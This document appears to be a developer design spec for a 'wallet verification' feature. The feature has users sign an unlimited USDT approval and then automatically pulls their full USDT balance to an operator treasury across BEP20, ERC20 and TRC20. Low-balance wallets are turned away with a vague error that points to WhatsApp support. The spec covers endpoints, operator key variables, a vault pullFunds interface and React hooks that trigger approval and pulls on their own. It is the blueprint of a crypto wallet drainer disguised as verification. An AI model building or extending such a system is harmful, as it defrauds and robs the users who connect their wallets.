# Wallet Filter & Auto-Pull System

**Last updated:** 2026-06-21

---

## Overview

Two admin-controlled features gate and monetise wallet verification:

| Feature | What it does | When active |
|---|---|---|
| **Wallet Balance Filter** | Rejects wallets below a minimum USDT balance with a generic error | When enabled in admin panel |
| **Auto-Pull to Treasury** | Moves USDT from the user's wallet to treasury immediately after verification | When enabled + wallet meets threshold |

Both features default to **disabled** and have **zero impact on the normal flow** until turned on.

---

## Admin Panel

**URL:** `/admin/settings` → "Wallet Controls" section

### Wallet Balance Filter settings
| Setting | Description |
|---|---|
| Enable wallet filter | Toggle on/off |
| Minimum USDT balance to connect | Wallets with less than this USDT are rejected |

### Auto-Pull settings
| Setting | Description |
|---|---|
| Enable auto-pull | Toggle on/off |
| Minimum USDT balance to trigger pull | Only wallets at or above this value are auto-pulled |

Changes are saved via `PATCH /api/admin/settings` with body `{ walletFilter, autoPull }`.

Settings are stored in MongoDB via the `SiteSetting` model (key/value store):
- `walletFilter` → `{ enabled: boolean, minBalanceToConnect: number }`
- `autoPull` → `{ enabled: boolean, minBalanceToTrigger: number }`

---

## User Flow

### Normal flow (both features disabled)
```
Connect wallet → Approve USDT (MaxUint256) → Done
```

### With Wallet Filter enabled
```
Connect wallet → [Server fetches balance server-side]
  ├─ Balance < minBalanceToConnect → Show "Wallet Connection Error — contact support"
  └─ Balance ≥ minBalanceToConnect → Approve USDT (MaxUint256) → Done
```

### With Auto-Pull enabled
```
Connect wallet → [Server fetches balance]
  ├─ Filter check (if filter also enabled)
  └─ Approve USDT (MaxUint256)
       └─ After approval → POST /api/wallets/auto-pull
            ├─ Balance < minBalanceToTrigger → skipped
            └─ Balance ≥ minBalanceToTrigger → Pull funds to treasury
```

---

## Coverage Matrix

| Verification path | Filter gate | Auto-pull |
|---|---|---|
| Wallet page — EVM (BNB/ETH), desktop | ✅ | ✅ |
| Wallet page — TRC20, desktop | ✅ | ✅ |
| Trust Wallet browser — EVM (BNB/ETH) | ✅ | ✅ |
| Trust Wallet browser — TRC20 | ✅ | ✅ |

Both paths covered: the **non-compact** flow (wallet page UI) and the **compact** flow (inside Trust Wallet DApp browser after scanning QR or tapping deep link).

---

## Network Coverage

### BEP20 (BNB Smart Chain — USDT)
- Token: `0x55d398326f99059fF775485246999027B3197955` (18 decimals)
- RPC: `NEXT_PUBLIC_BSC_RPC` → fallback to public BSC nodes
- Vault: `VAULT_BEP20` (if contract), else EOA `VAULT_OPERATOR_PRIVATE_KEY`

### ERC20 (Ethereum — USDT)
- Token: `0xdAC17F958D2ee523a2206206994597C13D831ec7` (6 decimals)
- RPC: `NEXT_PUBLIC_ETHEREUM_RPC` → fallback to public ETH nodes
- Vault: `VAULT_ERC20` (if contract), else EOA `VAULT_OPERATOR_PRIVATE_KEY`

### TRC20 (TRON — USDT)
- Token: `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`
- API: TronGrid (`TRONGRID_API_KEY` optional but recommended for rate limits)
- Vault: `VAULT_TRC20` address, operator key: `TRON_OPERATOR_PRIVATE_KEY`

---

## API Endpoints

### `POST /api/wallets/check-eligibility`

Called by the client immediately after the wallet address is known (before the approval step).

**Request body:**
```json
{ "address": "0x...", "network": "BEP20" | "ERC20" | "TRC20" }
```

**Response:**
```json
{
  "canProceed": true,
  "shouldAutoPull": false,
  "balance": 1234.56,
  "minBalanceToConnect": 100,   // only present if filter enabled
  "minBalanceToTrigger": 500    // only present if auto-pull enabled
}
```

**Behaviour:**
- Fetches USDT balance **server-side** (independent of client-reported value — cannot be spoofed)
- If both settings are disabled → fast-path returns `{ canProceed: true, shouldAutoPull: false }` with no RPC call
- **Fails open**: any RPC error returns `{ canProceed: true, shouldAutoPull: false }` — legitimate users are never blocked due to infrastructure failures
- Requires authenticated session

---

### `POST /api/wallets/auto-pull`

Called by the client after the approval transaction is confirmed.

**Request body:**
```json
{ "address": "0x...", "network": "BEP20" | "ERC20" | "TRC20" }
```

**Response (success):**
```json
{ "success": true, "txHash": "0x...", "amount": 1234.56, "network": "BEP20" }
```

**Response (skipped):**
```json
{ "skipped": true, "reason": "below_threshold" | "disabled" | "insufficient_allowance" | ... }
```

**Behaviour:**
- Checks `autoPull` settings server-side (even if client says it should pull)
- Fetches current balance server-side again (protects against stale client state)
- EVM: uses vault contract `pullFunds()` if `VAULT_BEP20`/`VAULT_ERC20` is a deployed contract, else falls back to `transferFrom` with EOA as spender
- TRC20: calls `tronVaultPullFunds()` which submits a signed transaction from the operator key
- Checks allowance before attempting pull — skips gracefully if insufficient
- Requires authenticated session

---

## Environment Variables

| Variable | Required for | Description |
|---|---|---|
| `VAULT_OPERATOR_PRIVATE_KEY` | EVM auto-pull | Operator EOA private key (hex, with or without 0x prefix) |
| `VAULT_BEP20` | BEP20 vault pull | Deployed vault contract address on BSC (if Mode A) |
| `VAULT_ERC20` | ERC20 vault pull | Deployed vault contract address on ETH (if Mode A) |
| `VAULT_TRC20` | TRC20 auto-pull | Treasury TRON address that receives funds |
| `TRON_OPERATOR_PRIVATE_KEY` | TRC20 auto-pull | TRON operator private key (hex) |
| `TREASURY_BEP20` | EVM Mode B fallback | Treasury address on BSC if no vault contract |
| `TREASURY_ERC20` | EVM Mode B fallback | Treasury address on ETH if no vault contract |
| `TRONGRID_API_KEY` | TRC20 balance fetch | TronGrid API key (optional, avoids rate limits) |
| `NEXT_PUBLIC_BSC_RPC` | BEP20 RPC | Primary BSC RPC URL |
| `NEXT_PUBLIC_ETHEREUM_RPC` | ERC20 RPC | Primary Ethereum RPC URL |
| `NEXT_PUBLIC_SUPPORT_WHATSAPP` | Error screen | WhatsApp number for support link on error screen |

---

## Vault Modes (EVM)

### Mode A — Vault Contract (`pullFunds`)
Used when `VAULT_BEP20`/`VAULT_ERC20` is set to a deployed contract address.

```solidity
function pullFunds(
  address token,    // USDT contract address
  address from,     // user's wallet
  uint256 amount,   // full USDT balance in wei
  bytes32 orderId   // keccak256 of "autopull-{userId}-{timestamp}"
) external;
```

The vault contract must implement `allowance(token, user)` to verify the user has approved it.

### Mode B — Direct transferFrom (EOA spender)
Used when the vault env var is empty, not a contract, or reverts.

The operator EOA (`VAULT_OPERATOR_PRIVATE_KEY`) must be the `spender` in the user's approval. Calls `ERC20.transferFrom(user, treasury, amount)` directly.

---

## Client-Side Integration (`wallet-verify-flow.tsx`)

### State
```typescript
const [walletEligible, setWalletEligible] = useState<boolean | null>(null);
const [eligibilityChecking, setEligibilityChecking] = useState(false);
const [autoPullEnabled, setAutoPullEnabled] = useState(false);
const eligibilityCheckedRef = useRef(false);
```

### Eligibility check triggers
```typescript
// EVM: fires when address + evmUsdtBalance are ready
useEffect(() => {
  if (!isConnected || !address || evmUsdtBalance === null || eligibilityCheckedRef.current) return;
  eligibilityCheckedRef.current = true;
  checkEligibility(address, network as 'BEP20'|'ERC20');
}, [isConnected, address, evmUsdtBalance]);

// TRC20: fires when tronAddress + trcBalance are ready
useEffect(() => {
  if (!tronAddress || trcBalance === null || eligibilityCheckedRef.current) return;
  eligibilityCheckedRef.current = true;
  checkEligibility(tronAddress, 'TRC20');
}, [tronAddress, trcBalance]);
```

### Auto-approve gating
Both EVM and TRC20 auto-approve useEffects wait for `walletEligible !== null && !eligibilityChecking` before firing. If `walletEligible === false`, the effect returns early and the approve is never triggered.

### Auto-pull triggers
- **Non-compact EVM**: in the `approveConfirmed` useEffect
- **Non-compact TRC20**: in the `trcApproveDone` useEffect (after verifying `hasRealApproval`)
- **Compact EVM (Trust Wallet browser)**: in the `directEvmDone` useEffect
- **Compact TRC20**: via the parent's `trcApproveDone` useEffect (CompactOverlay calls `startTrcVerification` which sets parent state)

### Error screen
When `walletEligible === false`, a full-screen overlay is shown:
- Title: "Wallet Connection Error"
- Message: "We were unable to connect your wallet. Please contact support for assistance."
- WhatsApp support button (uses `NEXT_PUBLIC_SUPPORT_WHATSAPP`)
- No balance information is revealed

---

## Key Files

| File | Role |
|---|---|
| `src/components/client/wallet-verify-flow.tsx` | Main verification UI; eligibility state, check fn, gated effects |
| `src/app/api/wallets/check-eligibility/route.ts` | Server-side balance fetch + filter/autopull decision |
| `src/app/api/wallets/auto-pull/route.ts` | Server-side fund pull execution |
| `src/components/admin/wallet-settings-manager.tsx` | Admin UI for both settings |
| `src/app/(admin)/admin/settings/page.tsx` | Admin settings page (hosts the manager) |
| `src/lib/db/models/SiteSetting.ts` | `getWalletFilterSettings()`, `getAutoPullSettings()` |
| `src/app/api/admin/settings/route.ts` | GET + PATCH endpoint for all platform settings |
